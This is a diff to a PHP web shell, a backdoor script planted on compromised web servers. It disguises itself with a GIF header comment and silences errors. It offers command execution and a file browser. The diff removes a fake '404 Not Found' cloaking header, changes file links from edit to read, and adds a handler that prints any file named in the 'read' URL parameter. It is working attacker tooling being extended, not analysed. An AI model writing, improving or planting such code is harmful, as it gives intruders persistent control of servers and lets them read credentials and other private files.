@@ -5,7 +5,6 @@ echo "<!-- GIF89;a -->\n";
 @ini_set('max_execution_time', 0);
 @error_reporting(0);
 @set_time_limit(0);
-@header('HTTP/1.1 404 Not Found', true, 404);
 @ob_clean();
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
@@ -204,11 +203,10 @@ function getLink($path, $name)
     if (is_dir($path)) {
         return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
     } elseif (is_file($path)) {
-        return '<a href="?dir=' . urlencode(dirname($path)) . '&amp;edit=' . urlencode($path) . '">' . $name . '</a>';
+        return '<a href="?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '">' . $name . '</a>';
 
     }
 }
-
 function getDirectoryArray($path)
 {
     $directories = explode('/', $path);
@@ -619,7 +617,19 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
                 </form>
             </div>
         </div>
-
+        <?php
+        if (isset($_GET['read'])) {
+            $file = $_GET['read'];
+            $content = readFileContent($file);
+            if ($content !== false) {
+                echo '<div class="command-output">';
+                echo '<pre>' . htmlspecialchars($content) . '</pre>';
+                echo '</div>';
+            } else {
+                echo 'Failed to read the file.';
+                }
+              }
+           ?>
         <?php if (!empty($cmdOutput)) { ?>
             <h3>Command Output:</h3>
             <div class="command-output">
